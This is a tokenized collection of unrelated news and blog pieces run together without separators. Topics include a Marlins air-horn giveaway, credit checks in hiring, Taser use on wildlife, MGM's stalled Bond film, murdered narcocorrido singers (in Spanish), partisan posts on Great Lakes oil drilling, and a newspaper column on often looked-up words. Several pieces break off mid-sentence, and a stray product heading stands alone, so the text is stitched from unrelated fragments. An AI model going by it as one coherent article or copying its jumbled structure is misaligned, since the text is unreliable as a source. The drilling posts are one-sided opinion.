MIAMI -- When Florida Marlins outfielder Cody Ross arrived for work Sunday morning , he grabbed a bright yellow vuvuzela from his locker and sent noise blaring through the Marlins ' clubhouse .
One day after horngate , the Marlins could laugh about it .
A little bit , anyway .
Saturday 's 9 - 8 , 11 - inning loss to the Tampa Bay Rays will be remembered for the overwhelming din created by 15,000 air horns distributed to fans in World Cup - themed giveaway , as well as the possibility that the noise caused confusion between Marlins manager Fredi Gonzalez and plate umpire Lance Barksdale -- who got their signals crossed on what became a costly botched lineup change in the ninth .
Still , Marlins president David Samson beamed over the promotion , pronouncing it a clear success .
" It was absolutely outstanding , " Samson said Sunday .
" I got two e-mails from older people and we moved their seats because it was loud .
To give you an idea , that is the least number of e-mails for things that go on during the course of a game that you could possibly have . "
After Saturday 's game , Marlins players had different views .
" Awful , " Ross said .
" Brutal , " second baseman Dan Uggla said .
And on Sunday , Rays manager Joe Maddon -- who had said the horns should be banned by baseball -- was n't backing down , either .
" They 're annoying , " Maddon said .
" There 's cool things and there 's very non-cool things .
That 's a non-cool thing .
...
You could even almost attribute the mix - up possibly last night , if there was one , to the fact that it was so loud . "
The horns given out Saturday were about half the size as the vuvuzelas that provide the constant -- some say annoying -- buzz from the stands at World Cup matches .
Nonetheless , they packed such a noisy punch for the Marlins and Rays that players and umpires quickly popped in earplugs , and conversations even in the dugouts were nearly impossible .
" I 'm always into some crazy ideas myself , " Maddon said .
" I would just put that into the column that it did n't quite work . "
It might not go into the books with the same infamy as 10 - cent beer night did in Cleveland in 1974 , or the giveaway baseballs that turned into giveaway projectiles and prompted a Dodgers forfeit in 1995 , or the gold standard for baseball marketing debacles -- Disco Demolition Night at Comiskey Park in 1979 .
Still , there 's a good chance the horns have blared for the last time at a Marlins game .
" There was some thought put into it , some foresight , " Marlins vice president of marketing Sean Flynn said last week .
Clearly , the Marlins did n't see this coming .
Perennially one of the worst - drawing teams in baseball , Florida often turns to promotions in an attempt to boost ticket sales .
Some are hits , some are misses , and others are messes , like the pompom giveaway last May on a breezy night -- countless shiny , silvery strands blew off the toys and landed on the field throughout the game , making it seem like tinsel on the world 's flattest Christmas tree .
" I never knew anybody complained about the field being loud , " White Sox manager Ozzie Guillen said in Washington on Sunday .
" They 're not Tiger Woods . ... Baseball is supposed to be played with a lot of noise . "
Whether it was the horns , the visit from an in - state rival or the Merengue concert afterward , the Marlins drew twice as many fans Saturday as they had for games earlier in the week when the Texas Rangers were in town .
" I guess it was a gadget to get people out there , " Rangers manager Ron Washington said Sunday .
" Sometimes the fans are so loud in the ballpark you wish they would just calm down .
Seriously . "
Gonzalez and Barksdale probably would have appreciated some more calm from the stands .
Gonzalez went out to make changes before the ninth , and his card was clearly marked in the Florida dugout -- Wes Helms batting third for Hanley Ramirez , a pitcher [ it just said pitcher ] in the cleanup spot for Jorge Cantu , and Brian Barden batting ninth in the customary pitcher 's spot .
But when Barksdale reported the change to the Tampa Bay dugout , he had Helms ninth , Barden third .
Barden summarily batted out of order , erasing a leadoff walk with the game tied in the ninth , and Gonzalez was thrown out for pleading his case .
" It 's an embarrassing thing and it's an unfortunate thing , " Gonzalez said .
" But whether we won the game or lost the game because of that , I do n't think so . "
The dismal growth prospects of many European countries has raised an increasing number of questions about whether large parts of the continent will emulate Japan of the 1990s and endure a decade - long economic stagnation .
On the face of it , a long - lasting Japan - style post - bubble slump with deflation seems a plausible outcome for a large part of the continent .
But then not many people who understand European economies also understand Japans .
One person who does is Adam Posen , member of the Monetary Policy Committee of the Bank ...
Today in relationship advice from the animal kingdom : how to have a happy marriage by loving your partners like you love your pets : stupidly .
Advertisement
This advice comes via the Well Blog of the Times , a paper long enamored of stories that compare spouses to animals .
Who can forget the famous / infamous " What Shamu Taught Me About a Happy Marriage , " in which Amy Sutherland learned to manage " the American husband " using techniques borrowed from " exotic animal trainers " ( Shamu apparently also taught her how to get a book deal ) ?
Now Well 's Tara Parker - Pope quotes psychologist Suzanne Phillips , who thinks couples can learn from less exotic beasts as well .
Phillips writes that while we often think of pets as " undemanding " or providing " unconditional love , " actually " most pets are loved in a way that makes us minimize or even deny the reality that they definitely have demands we simply accept . "
Translation : most pets are assholes , but we love them anyway , and maybe we should do the same in human relationships .
Advertisement
Phillips also offers some specifics .
On " holding grudges , " she writes ,
When you do return home to find that your cats have redecorated the room with shreds of every tissue they could find or the dog has eaten some of the mail , you may well react with a choice expletive but you are not likely to hold a grudge .
You are still going to be petting Donatello or cuddling with Thor the next day .
G/O Media may get a commission Subscribe and Get Your First Bag Free Promo Code AtlasCoffeeDay20
Of course , perhaps one reason we love our pets so much may be the fact that we are free to give them stupid-ass names that express our questionable personal aesthetics .
I really hope " Donatello " above is a turtle — but in that case , why is someone petting him ?
And on " assuming the best , "
There is a natural tendency to forgive pets their trespasses – after all , the dog was n't trying to torture you by eating the mail .
Was your partner really trying to torture you by putting it in such a safe spot it can't be found ?

Basically , Phillips is saying that we 're kind of dumb when it comes to our pets ( does the guy who says " The cats are a predictable source of comfort and soothing – they want to be near me " actually have cats ? ) .
And we think they 're pretty dumb too , lacking in the kind of forethought and intention necessary to , say , torture us by eating the mail .
Perhaps we would be happier if we assumed a certain idiocy on the part of our partners , and adopted this idiocy as well .
But really , this advice is nothing new .

The Housing Bubble :
The Higher Education Bubble :
The top chart above shows the housing bubble in the U.S. , using monthly median new home prices ( Census data here ) and the monthly Consumer Price Index ( CPI , data here ) , back to 1978 , where both series are adjusted to equal a value of 100 in January 1978 .
The bottom chart illustrates a much , much bigger bubble than the real estate bubble - the " higher education bubble " - based on an annual comparison of the CPI , median new home prices and the CPI for " College Tuition and Fees " ( data here ) .
Note that the housing bubble resulted from about a 4 - time increase in home prices between 1978 and 2006 , and college tuition has now increased by more than twice that amount since 1978 - it 's gone up by more than a factor of ten times .
The college tuition bubble makes the housing price bubble seem pretty lame by comparison .
" It 's a story of an industry that may sound familiar .
The buyers think what they 're buying will appreciate in value , making them rich in the future .
The product grows more and more elaborate , and more and more expensive , but the expense is offset by cheap credit provided by sellers eager to encourage buyers to buy .
Buyers see that everyone else is taking on mounds of debt , and so are more comfortable when they do so themselves ; besides , for a generation , the value of what they 're buying has gone up steadily .
What could go wrong ?
Everything continues smoothly until , at some point , it does n't .
Yes , this sounds like the housing bubble , but I 'm afraid it 's also sounding a lot like a still - inflating higher education bubble .
And despite ( or because of ) the fact that my day job involves higher education , I think it 's better for us to face up to what 's going on before the bubble bursts messily . "
Job seekers ' latest hurdle : Credit checks
NEW YORK ( CNNMoney.com ) --
Falling behind on your bills ?
It could cost you a job .
An increasing number of employers are using credit checks to screen potential job applicants .
So missed payments on your mortgage , car or credit card could keep you from getting hired .

According to a survey by the Society for Human Resource Management , 60 % of employers are using credit checks when filling at least some of their openings .
Only 35 % reported checking credit in a 2003 survey , and only about 13 % did so 1996 .
The timing could not be worse .
" At exactly the time everyone 's credit seems to be going down the toilet , more and more employers are using this , " said Nat Lippert , research analyst for the union Unite Here .
" You get in a Catch - 22 : You can't pay your bills because you do n't have a job , and now you can't get a job because you can't pay your bills . "
Unite
Here has been active in a recent push for laws to greatly limit employer 's use of the credit reports in hiring decisions .
So far three states have passed such laws -- Hawaii , Oregon and Washington , and legislation has already passed in Illinois and is headed to the governor .
The laws would make it illegal for employers to access credit history unless they can show that it 's relevant to a job 's duties , such as handling money or having access to customers ' financial information .
Bills have been introduced in 16 other states and the District of Columbia , and Federal legislation is currently pending in Congress .
Businesses have pushed back hard against such laws .
" Is it helpful to the employment process ?
Employers seem to think yes .
They do n't spend money on products they do n't think bring value " said Stuart Pratt , CEO of Consumer Data Industry Association , the trade association for the credit rating agencies .
Pratt says that a credit check gives employers details about accounts in collection , debt levels , bankruptcies and other problems that would cast doubt on someone 's ability to handle responsibility .
It does not report credit scores or account numbers .
Pratt also argues that the credit histories are only one factor considered by employers , and that prospective employees are supposed to be given the chance to respond to what their credit check turns up .
But consumer advocates and some job seekers say that candidates are being unfairly judged by the circumstances of their private lives .
" Employers have adopted this method as a proxy for character reference , believing it reflects on people 's ability to handle responsibility , " said Ben Woolsey , director of marketing and consumer research for CreditCards.com .
" That 's a bit of a reach . "
Tai Davis used to work in information technology for a financial services firm .
Part of her job was helping customers who had been victims of identity theft or other fraud .
" I had access to the social security numbers , credit card numbers , home addresses , bank account numbers of millions of people .
For years I safeguarded it , " she said .
Davis said she had medical problems that caused her to miss a lot of work .
When she returned from medical leave , she found she had lost her job .
With $ 20,000 in medical bills and no work , her credit eventually took a dive .
" I have been told I can not be hired because of my credit .
They will not even interview me , " she said .
Davis said she has applied for all types of jobs , not just financial services .
She said a bankruptcy filing would help her fix her credit but she fears it would be an even greater barrier to finding work .
James , a cashier from Nashville who asked that his last name not be used , admits he had bad credit when the store he worked at closed in October 2008 .
He said he soon had two job offers at other stores , but that both disappeared when his credit history was checked .
His unemployment left him homeless for a time in 2009 .
James attributes his bad credit to a divorce a few months before he lost his job .
" I did the best I could , but at one point , it was make my car payment or make my child support payment and I picked child support .
They repossessed my car , " he said .
James said that despite his credit problems , he was an honest worker and never stole a penny from the large deposits he was entrusted with .
Indeed , consumer advocates say the overwhelming majority of job applicants with credit problems do n't steal from their employers and it's unfair for their credit situation to be held against them .
" In this economy there are all types of very good candidates who will show up with credit problems that have nothing to do with their ability to do the job , " said Maurice Emsellem , policy co-director for the National Employment Law Project .

Sluggish sales at Scottsdale - based Taser International have the company targeting a new market for its stun guns : wildlife .
Taser and the Alaska Department of Fish and Game are testing the guns on distressed or aggressive wayward animals , including moose , bears and deer .
Officials say the devices are successful because animals recover more quickly from an electric shock than the more traditional darts containing narcotics .
But animal - rights activists question the stun guns ' safety and say the Tasers cause the animals overwhelming pain .
Instead , they argue that loud noises such as horns and whistles can be used to run animals off .
They suggest pepper spray for personal safety and installing fencing or applying pepper - based repellents to keep animals away .
Lastly , they say the state should require bear - proof enclosures around restaurant trash bins and make it illegal to feed wildlife .
" In extreme nuisance - wildlife cases , large wild animals ( without young ) can be live - trapped and relocated , " the group People for the Ethical Treatment of Animals said in an e-mail .
" The safest and most humane way to deal with unwanted wild animals is to leave them alone .
With a little time , they will move on .
With a little thought , these issues can be resolved without resorting to high voltage . "
Taser is familiar with controversy .
For years , it has used an aggressive strategy for fighting product - liability and wrongful - death lawsuits over the use of its law - enforcement stun guns .
A sour economy has the company experiencing lower sales recently because of slow demand for its guns , particularly overseas .
In April , Taser reported it lost $ 492,605 , or 1 cent per share , in the fourth quarter on revenue of $ 23.8 million .
Taser attributed the 3 percent decline in revenue to a slowdown in international sales that offset modest increases in the U.S .
Taser CEO
Rick Smith said then that the company continues to work on diversifying through new software products , such as its Protector cellphone - monitoring system , which parents can use to see who their kids call or text .
The company also recently began offering its first multishot stun gun and a video - recording device for police officers , as well as stun guns for personal safety .
Taser is hopeful the wildlife research that it began with Alaska four years ago will help drive orders in a new area .
" With four years of hard work , this now establishes some really solid research , " said Steve Tuttle , a Taser spokesman .
" We 've never really had an agency of this size formally accept it after testing like this . "
Tasers have a range of 35 feet and cost $ 800 .
Local animal - control agencies in the past used the guns sporadically for aggressive dogs , moose and deer .
They usually deploy them so they can subdue the animals , harness them and move them to safety .
" You 'd be shocked how many deer will jump through windows of homes up in Michigan and Canada , " Tuttle said , adding that moose tangled up in fences also present problems in some areas .
" Nobody will go near these animals , but if they can control them , they 'll use a Taser . "
The guns are proving to be a viable option for wildlife managers when dealing with angry and confused animals , said Larry Lewis , an Alaska Fish and Game wildlife technician .
" We 're finding there does n't appear to be any deleterious long - term effects to the animals that are subjected to an electronic - control device if it's done properly , " Lewis said .
Last winter , he and a supervisor received a call about a yearling male moose with a galvanized chicken feeder stuck over its head .
The animal had put is nose down through the top of the feeder and could n't see well .
The situation was bad enough that Lewis shot the moose with a Taser to knock it down .
His boss ran over , pulled the feeder off and checked for injuries .
Seeing none , he came back to Lewis , who turned off the stun gun .
" The animal got up and ran off , " Lewis said .
" We did n't have to use drugs .
There 's always an inherent risk anytime we dart animals .
Some of these drugs are very dangerous to work with . "
Other methods that can be used to subdue animals include rubber bullets , pepper spray , bean - bag rounds and regular firearms .
The American Veterinary Medical Association has a formal policy against using Tasers , saying they can be lethal and should not be used on cats or other small animals .
When using tranquilizing guns , a large dose of medication is shot from a long distance into the animals with a . 22 - caliber shell , and it has to hit a specific spot , said Andrew Hinz , Taser director of technical services .
He said there is a 60 percent to 70 percent mortality rate when using the guns with large doses of medication .
By deploying a Taser , wildlife managers are able to subdue the animals for up to 15 seconds , approach them and hand - inject the sedative into a specific location .
The result , he said , is less impact on the animal 's physiology .
Hinz could n't provide a comparable Taser mortality rate .
But he said a Wake Forest University study , funded by the National Institute of Justice , showed a low rate of serious injury with a Taser device compared with other uses of force .
He said big moose and brown bears pay little attention to rubber bullets .
The company is receiving calls from wildlife officials from several states in the Midwest and West , where the stun guns could be useful against black bears and elk .
He also expects a market to develop in Canada .
" Even ranchers in Montana , where they have their steers , they 're looking at the safety of actually using this device , " he said .
Lewis has taken calls from as far away as Africa , Britain and the Yukon Territory .
He recently presented his research to peers who attended a workshop in Alberta on the conflicts between humans and bears .
" I went in there fully expecting to be accosted and run out on a rail over this use , " he said .
" I was really pleasantly surprised .
Even the people that I thought would be totally opposed to it actually embraced it and said , ' We think this is great .
If an animal 's life is saved , we 're 100 percent for it . ' "
Lewis and the Alaska state veterinarian carry Tasers full time .
A select group of area biologists and conservation staff was recently trained to use them , Lewis said .
He added that they may one day be used in animal - handing facilities , including zoos , stockyards and research facilities .
" We look at the electronic - control devices as another option for people to use in the field , " he said .
" It 's another tool on the tool belt , basically .
I still carry firearms and still use rubber baton and bean - bag rounds and all these other tools that we use , but Taser is now part of our arsenal . "
The woes faced by the deeply in debt MGM only seem to be worsening : First Ian McKellen let it be known that he is n’t going to wait around forever to star in The Hobbit , and late last Friday Ain’t It Cool broke the news that all development on a new James Bond film has been completely scrapped .
The studio had been planning another Daniel Craig - starring Bond feature with Sam Mendes directing from a script by Frost / Nixon writer Peter Morgan , only to announce back in April that it would be indefinitely delayed while MGM put itself on the auction block .
Now production company EON is reaffirming that it does n’t know when development will resume .
While MGM holds its breath and waits for someone , anyone to agree to step up and try to straighten out its financial quagmire , the future of both projects certainly seems grim .
We ’re thinking about passing the hat with a PayPal account ; who wants to own a piece of a once - great studio ?
We could all work together to make movie magic , and have weekly pizza parties in the break room .

El narcocorrido tenía un precio Recitar las gestas de los barones de la droga conduce con frecuencia a la muerte a manos de un cártel rival

Sergio Vega , « El Shaka » , lo asesinaron a bordo de un carro rojo , como en uno de los narcocorridos más populares de Los Tigres del Norte .
El cantante , de 40 años , se dirigía en su Cadillac a ofrecer un recital en Sinaloa , cuando unos asaltantes le cortaron el paso , le descerrajaron 30 disparos y lo remataron con el tiro de gracia .
No es el primer artista de música norteña , grupera o de banda que cae en los últimos años bajo , supuestamente , la pólvora del crimen organizado .
El más sentido es Valentín Elizalde , « El Gallo de Oro » , acribillado tras una actuación en el palenque de Reynosa ( Tamaulipas ) en 2006 , cuando se desplazaba en su furgoneta para , según dicen , dar un « concierto privado » .
Las malas lenguas sugieren que Elizalde fue muerto por haber cantado dos veces « A mis enemigos » , canción utilizada en internet por los secuaces de « El Chapo » Guzmán ( capo del cártel de Sinaloa ) para amenazar a sus rivales de « Los Zetas » .
También han perdido la vida de forma violenta Carlos Ocaranza ( « El Loco Elizalde » ) , José Luis Aquino ( trompetista de Los Conde ) , Sergio Gómez ( vocalista de K - Paz de la Sierra ) , Javier Morales ( de Los Implacables del Norte ) , cuatro miembros de La Banda Fugaz , tres de Los Padrinos de la Sierra , Jesús Rey David Alfaro « El Gallito » ...
Y desde Chalino Sánchez , abatido en 1992 , muchos los precedieron .
En septiembre de 2009 , « El Shaka » era detenido por la policía en el Far West Rodeo de Monterrey .
Mientras cantaba , los federales capturaron a tres miembros del cártel del Golfo .
Tampoco era el primero en estar en el momento y el lugar equivocados .
Hace unos meses , Ramón Ayala y Los Bravos del Norte fueron apresados en una hacienda de Tepoztlán , cuando un comando del Ejército irrumpió en una fiesta para capturar a Arturo Beltrán Leyva , quien consiguió huir dejando un rastro de coca , putas y dinero .
« Trabajo es trabajo » , dijo Paquita la del Barrio en defensa de sus compañeros .
Trova a ritmo de polka
La música norteña , que engloba los estilos más populares –en todas las acepciones– de México , es desde la Revolución ( Villa o Zapata tenían sus corridos ) cronista social al margen del poder y de los medios de comunicación .
Una trova que , a ritmo de polka , cumbia , vals o country , le canta al amor , a la vida , a la muerte y a los héroes y los villanos ( a menudo , difíciles de distinguir ) .
Emisoras de radio y canales televisivos difunden sus cantares por más que la piezas que ensalzan las gestas de los narcotraficantes están prohibidas por ley .
Con sus botazas y su sombrero , « El Shaka » jugaba con fuego .
Y lo sabía .
Su repertorio incluye temas como « Luto en el Cielo » , inspirado en la muerte de Amado Carrillo Fuentes ( « Acordeones ya no lloren , / bajo sexto no se queje / , las arañas en el monte / saben el teje y maneje .
/ Los narcos en Sinaloa / no respetaron al jefe » ) .
Minutos antes de su muerte , el cantante llamó angustiado a su representante .
« Me dijo que lo iban siguiendo , me pidió que le hablara a alguien para que lo ayudaran , pero cuando llegó ya era demasiado tarde » , explicó su mánager , Juan Carlos de la Vega : « Sergio era una persona tranquila , honesta , sin problemas , aunque alguna vez conoció el peligro que implicaba interpretar la música a la que él se dedicaba ” » .
Los barones de la droga no fueron los primeros delincuentes en ser inmortalizados por el corrido ( cuya estructura narrativa nace del romance español : introducción , nudo y desenlace ) .
Género fronterizo ( su popularidad es enorme entre los emigrados a EE.UU . ) , los contrabandistas del siglo pasado ya tenía juglar que los cantara .
Así , de Mariano Reséndez , quien durante el Porfiriato ( 1876 -1911 ) traficaba con textiles , se glosaba : « Traigo una pana muy fina , / y un casimir de primera , / y una buena carabina , / éntrale ahora que hay manera » .
De igual modo , durante la « ley seca » : « Mientras sigan las cantinas , / así seguirá pasando .
/ Porque el pobre está en la cárcel / y el rico se anda gozando » ( « Corrido de los Bootleggers » ) .
« El poder de fascinación que ejerce la narcocultura deriva de las expectativas de vida que genera »
Juan Carlos Ramírez - Pimienta , de la Universidad de San Diego , ha localizado el primer corrido que tiene a las drogas como temática : « Por morfina y cocaína » , grabado en Texas en 1934 por Manuel Valdez , narra los sufrimientos de los contrabandistas presos .
Tras una vacío de décadas , el género renace en 1972 con el tercer álbum de Los Tigres del Norte , « Contrabando y traición » , que incluye el tema homónimo , también conocido como « Camelia , la texana » .
Un « hit » sin precedentes que sería llevado al cine y , recientemente , al teatro .
Para José Manuel Valenzuela , autor de « Jefe de jefes : corridos y narcocultura en México » , « biblia » en la materia , «los corridos ofrecen una rica información sobre el narcomundo y las múltiples articulaciones que desde él se construyen con otros ámbitos de la sociedad .
Los narcocorridos participan en la elaboración de crónicas sociales , ofreciendo diversas perspectivas , muchas veces críticas a las versiones oficiales » .
En « El narcocorrido en México : Reflejo de una sociedad en crisis » , Noemïe Massard revela una tradición « llena de vitalidad , mostrando el lugar que ocupa el narcotráfico en la cultura mexicana contemporánea » .
Así , Hernán , miembro de Los Tigres del Norte , aseguraba que « ya no hay Revolución , ( sino ) mucho tráfico de droga » , por lo cual ellos le cantan a « lo que ocurre en el país » .
« El poder de fascinación que ejerce la narcocultura en nuestras sociedades no deriva de los cantos populares , sino de las expectativas de vida que genera » , defiende Valenzuela .
Jorge Verdugo , investigador de la Universidad Autónoma de Sinaloa , señala que , « pese a que el narcotráfico es una actividad negativa , ha hecho que la gente se identifique e incluso lo perciba con admiración » .
Los Tucanes de Tijuana , Los Amos de Nuevo León , Los Huracanes del Norte , Los Originales de San Juan , Grupo Exterminador , La Mafia o El Tigrillo Palma son algunos de los nombres más conocidos que se aplicaron al subgénero desde los años setenta .
Pero , ahora , sólo los intérpretes noveles le echan bemoles para intentar introducirse en el mercado estadounidense ( cerrada la puerta del éxito comercial en México ) .
Sin embargo , la mayoría de los autores permanecen en el anonimato y apenas si se dejan ver en fiestas privadas .
Una canción « por encargo » puede reportarles hasta 12.000 euros .
Los intérpretes de narcocorridos , como los de « gangsta - rap » , viven al filo de la navaja .
Aunque no siempre su muerte está relacionada con supuestos vínculos con el crimen organizado .
A menudo , es sólo la lotería que , según las previsiones , se ha de cobrar más de diez mil vidas este año en un país donde la violencia forma parte de sus señas de identidad .
The thing that makes Mark Cuban of the Dallas Mavericks one of the most entertaining owners in sports is that he has no unspoken thoughts .
In the past few days he 's sounded off in support of Cavs owner Dan Gilbert blasting LeBron James , talked about tampering by the Miami Heat and perhaps becoming the new owner of the Texas Rangers .
The one subject sure to get commissioner David Stern 's attention is the " tampering " word .
" I 'm going to bring it up to the league that we really do have to re-evaluate the issue of player tampering , " Cuban said .
" Who knows what will happen ?
But I have to suggest it to them because there has to be more definitive rules . "
There has been speculation that James , Dwyane Wade and Chris Bosh had been planning to join forces as long as 2006 .
It is unclear whether Cuban plans to file a charge but says " there has to be a way to keep these guys away from each other for the last week anyway . "

Best Insoles for Flat Feet – Our Ratings
I talk about the windpower potential of the lakeshore with voters all the time .
There is some NIMBYism out there , and I am cognizant of the local concerns relative to tourism .
However , we have to get serious about this , or Big Oil will definitely come after the Lakes .
I 'm continually amazed that as a vast body of water is being destroyed by Big Oil there are still those who behave as though the threat from drilling was an issue that needed further study .
We must become energy independent .
We must start as soon as possible .
We must begin the process of transitioning from fossil fuels to alternative energy sources and support the President 's efforts to build a " Green " economy .
Drilling in the Great Lakes IS NOT THE SOLUTION TO ACHIEVING ANY OF THOSE AIMS IN THE SHORT OR LONG TERM .
Further , suggesting such a thing only serves to validate the extent of Big Oil 's influence in government .
Enough !!!
While Toomey was in Erie on what he called his small - business tour , his Democratic opponent , U.S. Rep .
Joe Sestak , of Delaware County , released a video online with a Lake Erie theme .
The video focuses on the lake and highlights Toomey 's vote in 2001 to allow drilling in the Great Lakes .
The Sestak campaign said Toomey should be reminded how much Erie relies on a tourism economy and the jobs that come with it .
An oil spill similar to BP 's crisis in the Gulf of Mexico would contaminate all of the lake , Sestak 's campaign said .
Toomey called it a " ridiculous comparison ' ' because the blown - out BP wellhead is one mile below the water surface , while the deepest part of Lake Erie is 210 feet .
Toomey said he would not categorically and immediately rule out any Great Lakes drilling .
Republican U.S. Senate candidate Ron Johnson found himself under the political microscope late last week after it was revealed that he owns up to $ 315,000 in BP stock while he has defended the oil giant against its critics and called for continued offshore drilling .
The Wisconsin businessman -- who is vying , in a closer - than - expected contest , for Sen. Russ Feingold 's ( D - Wisc. ) seat -- has spent the last few weeks trying to temper criticism of BP in the wake of the Gulf spill .
Johnson , whom national Democrats like to refer to as the " forgotten Tea Party candidate , " has expressed disappointment with the administration 's " assault " on BP .
At the same time , he 's been a vocal advocate for continued and even accelerated oil and gas exploration , going so far as to express an openness to drilling in the Great Lakes .
" The bottom line is we are an oil - based economy , " he told the site WisPolitics in mid-June , when asked about drilling in the Great Lakes .
" There 's nothing we 're gonna do to get off of that for many , many years .
I think we have to be realistic and recognize that fact and , you know , I , I think we have to , get the oil where it is , but we have to do it where it is . "
Those comments and many others make Johnson among the most pro-drilling pols in a Republican Party filled with drilling proponents .
But in offering his support for the practice , Johnson did n't reveal that he has serious financial stakes in the continued success of BP and the greater oil and gas industry .
Johnson , who gave a speech before the Gulf oil spill in which he said , “ Big Oil [ is ] not evil , ” has repeatedly defended the oil industry , including BP , telling the media after the Gulf oil spill , “ [ T ] his is not the time to be beating up on those guys , quite honestly . ”
News reports have also detailed Johnson ’s support for oil drilling in national wildlife areas and his opposition to more caution before undertaking new oil - drilling projects in light of the worst oil spill disaster in American history .
Johnson also opposes the BP compensation fund for victims of the Gulf oil spill .
One month ago , Johnson was asked by the media , " Would you support drilling like in the Great Lakes , for example , if there was oil found there ? "
Johnson said , “ Yeah .
You know , the bottom line is that we are an oil - based economy .
There ’s nothing we ’re going to do to get off of that for many , many years , so I think we have to just be realistic and recognize that fact .
And I think we have to get the oil where it is … ”
Last week , with ongoing media coverage of the BP oil spill , and after weeks of delaying the financial disclosures required , it was revealed by the media that Johnson has invested as much as $ 315,000 with BP , $ 50,001 to $ 100,000 in Exxon Mobil and $ 15,001 to $ 50,000 in Occidental Petroleum Corp .
Wisconsin relies on the Great Lakes for everything from food to jobs and from power to recreation .
According to the Wisconsin Department of Natural Resources , 1.6 million Wisconsin residents get their fresh water directly from the Great Lakes .
On July 12 , the National Oceanic and Atmospheric Administration ( NOAA ) reported the area of the Gulf affected by the oil sheen is 84,101 square miles – an area nearly the same size as all five Great Lakes combined .
Feingold voted for the American Recovery and Reinvestment Act , which has funded maintenance of Wisconsin ’s harbors and canals , restored fish and wildlife habitats , and reduced pollution , including clean water and drinking water revolving loan funds , the Ashland NFWCO Fish Passage Program , Fox River dam infrastructure improvements , the Fox River navigation system ’s lock keeper houses , improvements to the Sturgeon Bay Ship Canal and harbor , and the Kewaunee and Manitowoc harbor dredging projects .
... The League of Conservation Voters recognizes Feingold as having one of the best lifetime voting records of any current U.S. Senator .
The Wisconsin Wildlife Federation and National Wildlife Federation have honored him for his efforts to protect water quality and fight for wetlands protections .
The State of Wisconsin honored Feingold for his strong support of State Wildlife Grants and he was awarded the Clean Water Champion Award by the Clean Water Network for his leadership on the Clean Water Restoration Act .
This weekend Blue America hosted a live chat with Michigan progressive Democrat Fred Johnson at Crooks and Liars .
And one of the issues in his race people were most worked up over involves drilling for oil in the Great Lakes .
Republicans , always eager to please their buddies at Big Oil , are pushing for it .
Fred , of course -- like most residents of the beautiful lakeside counties -- opposes it .
In response to a question about drilling in Lake Michigan , Fred was crystal clear : Radical right Club for Growth kook Pat Toomey ( R - PA ) has been advocating drilling in Lake Erie for some time now , something that could endanger the drinking water for roughly 40 million Americans .
Even back in 2001 , when Toomey was in Congress , he voted against a tremendously popular -- and bipartisan bill , H.R. 2311 to prohibit drilling in the Great Lakes watershed .
More recently , when Toomey was campaigning in Erie he was questioned by John Guerriero from the Erie Times - News , he was still talking about how wonderful drilling in the Great Lakes would be : Rep. Joe Sestak , who beat the Establishment Machine and Arlen Specter to win the Democratic Senate nomination opposes Big Oil 's calls for allowing drilling in the Great Lakes .
Like Fred Johnson in Michigan , Joe Sestak is clear as a bell about drilling in Lake Erie : " Congressman Toomey 's willingness to allow drilling in the Great Lakes shows that he does not understand the immense benefits of Lake Erie for the people of Erie County .
He would put at risk the keystone of Erie 's economy for the benefit of a few corporations and their shareholders .
In the event of a catastrophic accident -- like the BP disaster -- countless small businesses would be forced to close , and tens of thousands of jobs would be lost .
" Yesterday evening after reading this Sam Stein report at HuffPo , I tweeted this :
This is what it means to be a sociopath .
It 's not illegal ... but it makes no sense at all to elect them to public office so they can turn us all into their victims .
And , of course , it is n't just Ron Johnson putting this country in danger for his own narrow interests -- and it is n't only Republicans in the Great Lakes states either .
Just yesterday , Heather Beaven reminded us that a Florida sociopath , John Mica , brags on his website that " I voted to drill in the Everglades in the 1970 ’s and I ’d do it again today . ”
Mica is on Big Oil 's payroll -- and so are several members of his family .
He puts their financial interests ahead of the interests of the country .
That 's what it means to be a Republican politician in the 21st Century .
This is from a press release Feingold sent out this morning :
Labels : Fred Johnson , Great Lakes , Mica , Michigan , offshore drilling , Pennsylvania , Ron Johnson , Russ Feingold , Senate 2010 , Toomey , Wisconsin

Notes from the newsroom on grammar , usage and style .
( Some frequently asked questions are here . )
Times readers are literate and well educated .
But privately , away from the cocktail party , some of them may wonder : what exactly does “ jejune ” mean , anyway ?
If someone put a gun to my head , could I give a precise definition of “ atavistic ” ?
Fortunately , for our online readers , help is readily available .
Double - click any word in an article and a question mark appears ; click the question mark and you get a definition from the American Heritage dictionary .
Following up on a popular After Deadline post from last year , my colleague James Robinson , with help from Jeremy Safran , once again compiled a list of the 50 words that most often stumped the world ’s most brilliant newspaper readers .
( O.K. , in one case , 4,734 of those savants searched in vain for the definition of a word coined as a joke by a mischievous columnist . )
A few caveats about our data .
Obviously , how often a word is looked up by NYTimes.com readers depends in part on how often it ’s used and how many people read a particular article ( and unfortunately , the function does n’t yet work on our blogs ) .
Also , we eliminated from the list several common words like “ said ” and “ with ” that apparently showed up because people clicked on them inadvertently .
With that in mind , check out the top - 50 list , then return to this post for a few observations .
•••
As you no doubt realized , the entry with the highest rate of “ look - ups per use ” is n’t really a word at all .
“ Baldenfreude ” is a “ nonce word ” — a one - time coinage , in this case Maureen Dowd ’s fanciful twist on “ schadenfreude . ”
( Faithful After Deadline readers may recall my previous commentary on that German import . )
Several real foreign terms also made the list , which should remind us to be cautious in venturing from English in our writing .
There were two Latin phrases — “ sui generis ” ( a repeat entry from last year , meaning “ unique ” ) , and “ mirabile dictu ” ( “ wonderful to tell ” ) .
“ Kristallnacht ” is there — somewhat surprisingly , I thought — along with “ omertà ” and “ renminbi . ”
“ Hubris , ” “ crèches ” and “ démarche ” are foreign words that seem firmly established in English , but that still present hurdles for many readers .
•••
We all have blind spots in our vocabulary .
Going through the list without benefit of context , I ’ll admit — somewhat reluctantly — that there were at least two words for which I could n’t formulate coherent definitions : “ démarche ” ( “ a line of action ; move or countermove ” ) and “ cynosure ” ( “ a person or thing that is a center of attention or interest ” ) .
I might have been able to puzzle them out in context , but standing alone , they stumped me .
For some reason “ cynosure ” ( which can be pronounced with a short or long vowel sound in the first syllable ) seems to be crosswired in my brain with the completely unrelated “ sinecure ” ( “ an office or position providing income but requiring little work ” ) .
Perhaps the Greek roots would help me figure out “ cynosure ” ?
No , not this time : it comes from the Greek for “ dog ’s tail . ”
So how did it acquire its current meaning ?
Apparently “ the Dog ’s Tail ” is what we now call the Little Dipper , the constellation that includes the North Star .
Thus the “ center of attention or interest . ”
•••
Besides “ sui generis , ” other encore appearances from last year ’s list include “ antediluvian ” ( a favorite of mine , referring to the time before the Flood ) , “ solipsistic , ” “ peripatetic ” and “ ersatz . ”
These , apparently , are words we simply cannot do without — so study up , dear reader .
•••
